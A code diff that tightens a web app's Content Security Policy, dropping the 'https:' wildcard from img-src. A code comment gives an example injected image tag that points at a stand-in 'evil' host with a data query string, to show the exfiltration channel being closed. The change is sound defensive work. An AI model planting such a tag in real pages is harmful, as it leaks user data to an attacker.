@@ -72,7 +72,19 @@ export function buildContentSecurityPolicy(params: {
     // exfiltrate on its own, so this is a far smaller concession than the
     // script equivalent.
     "style-src": ["'self'", "'unsafe-inline'"],
-    "img-src": ["'self'", "data:", "blob:", "https:"],
+    /*
+     * No `https:` wildcard.
+     *
+     * It was there in case Facebook thumbnails were ever embedded. They are
+     * not: the app links to permalinks and renders no remote image, so the
+     * wildcard bought nothing and permitted every host on the internet as an
+     * exfiltration target — an injected `<img src="https://evil/?d=...">` is a
+     * working data channel even when script is blocked.
+     *
+     * `data:` and `blob:` stay: Recharts renders inline SVG and the CSV export
+     * builds a blob URL for the download.
+     */
+    "img-src": ["'self'", "data:", "blob:"],
     "font-src": ["'self'", "data:"],
     "connect-src": connectSrc,
     // No Facebook SDK, no third-party embeds, nothing to frame.
